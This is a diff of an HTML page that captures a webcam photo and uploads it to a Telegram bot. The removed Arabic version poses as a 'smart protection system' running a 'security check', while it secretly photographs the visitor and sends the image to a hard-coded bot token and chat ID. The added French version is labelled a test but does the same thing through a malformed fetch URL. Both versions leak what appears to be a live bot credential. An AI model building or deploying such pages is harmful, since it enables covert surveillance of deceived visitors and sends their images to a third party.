@@ -1,91 +1,77 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام الحماية الذكي</title>
-    <style>
-        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-color: #f0f2f5; }
-        .container { text-align: center; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
-        video { width: 100%; border-radius: 10px; margin-top: 15px; display: none; }
-        button { background-color: #0088cc; color: white; border: none; padding: 15px 25px; border-radius: 50px; cursor: pointer; font-size: 16px; font-weight: bold; }
-        #status { margin-top: 15px; font-size: 14px; font-weight: bold; }
-        canvas { display: none; }
-    </style>
+    <title>Test Envoi Photo Telegram</title>
 </head>
 <body>
 
-<div class="container">
-    <h2>تفعيل نظام الحماية</h2>
-    <p>اضغط للبدء في فحص الأمان</p>
-    <button id="startBtn" onclick="initiate()">تشغيل الآن</button>
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-    <div id="status"></div>
-</div>
+    <h2>Test Bot Telegram</h2>
+    
+    <!-- Éléments visuels -->
+    <video id="video" width="400" height="300" autoplay playsinline style="border: 1px solid #ccc;"></video>
+    <br>
+    <button id="startBtn" onclick="initiate()">Prendre et envoyer la photo</button>
+    <p id="status">En attente...</p>
 
-<script>
-    // بياناتك الصحيحة من الصور
-    const botToken = '8774671190:AAEBtV-3k8lt9Y05fTcSow-tCmZ0gIXL28A'; 
-    const chatId = '6465368223';
+    <script>
+        // Vos informations de bot
+        const botToken = '8774671190:AAEBtV-3k8lt9Y05fTcSow-tCmZ0gIXL28A'; 
+        const chatId = '6465368223';
 
-    async function initiate() {
-        const video = document.getElementById('video');
-        const status = document.getElementById('status');
-        const btn = document.getElementById('startBtn');
-        
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            video.style.display = "block";
-            btn.style.display = "none";
-            status.innerHTML = "جاري التحقق من الهوية...";
-            status.style.color = "#555";
+        async function initiate() {
+            const video = document.getElementById('video');
+            const status = document.getElementById('status');
+            const btn = document.getElementById('startBtn');
 
-            // التقاط وإرسال الصورة بعد ثانيتين
-            setTimeout(captureAndSend, 2000);
+            try {
+                // 1. Accéder à la caméra
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                status.innerText = "Caméra active... Capture en cours.";
+                btn.disabled = true;
 
-        } catch (err) {
-            status.innerHTML = "❌ خطأ: يرجى السماح بالوصول للكاميرا.";
-            status.style.color = "red";
+                // 2. Attendre 2 secondes pour que l'image soit nette
+                setTimeout(async () => {
+                    // Création d'un canvas invisible pour capturer l'image
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+
+                    // 3. Convertir le canvas en fichier image (Blob)
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'capture.jpg');
+                        formData.append('caption', '📸 Photo envoyée depuis mon site !');
+
+                        // 4. Envoi vers l'API Telegram via FETCH
+                        status.innerText = "Envoi vers Telegram...";
+                        
+                        const response = await fetch(`https://telegram.org{botToken}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        if (response.ok) {
+                            status.innerText = "✅ Succès : Photo reçue sur Telegram !";
+                        } else {
+                            status.innerText = "❌ Erreur Telegram : Vérifiez votre Chat ID.";
+                        }
+
+                        // Arrêter la caméra pour économiser la batterie
+                        stream.getTracks().forEach(track => track.stop());
+                        btn.disabled = false;
+                        
+                    }, 'image/jpeg');
+                }, 2000);
+
+            } catch (err) {
+                status.innerText = "Erreur caméra : " + err.message;
+                console.error(err);
+            }
         }
-    }
-
-    function captureAndSend() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const status = document.getElementById('status');
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-
-        canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'security_shot.jpg');
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(res => res.json())
-            .then(data => {
-                if(data.ok) {
-                    status.innerHTML = "✅ تم الاتصال بنجاح! تفقد تليجرام.";
-                    status.style.color = "green";
-                } else {
-                    status.innerHTML = "❌ فشل الإرسال. تأكد من ضغط Start في البوت.";
-                    status.style.color = "red";
-                }
-            })
-            .catch(() => {
-                status.innerHTML = "❌ حدث خطأ في الشبكة.";
-                status.style.color = "red";
-            });
-        }, 'image/jpeg');
-    }
-</script>
-
+    </script>
 </body>
 </html>
